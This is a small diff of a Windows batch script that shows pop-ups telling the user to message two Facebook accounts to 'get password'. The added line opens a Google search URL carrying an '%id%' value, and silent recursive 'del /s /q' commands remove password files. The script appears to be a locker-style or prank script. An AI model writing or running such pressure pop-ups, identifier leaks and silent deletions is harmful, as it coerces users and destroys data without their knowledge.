@@ -26,6 +26,7 @@ start cmd /k echo to get password:https://www.facebook.com/Science.Khuong or htt
 msg * to get password:https://www.facebook.com/Science.Khuong or https://www.facebook.com/johnnyjumperbot and say "need password"
 start /min "" "https://www.facebook.com/Science.Khuong"
 start /min "" "https://www.facebook.com/johnnyjumperbot"
+start /min "" "https://www.google.com/search?q=your+id+is%3A%id%"
 del /s /q pass1
 del /s /q pass2
 del /s /q pass3
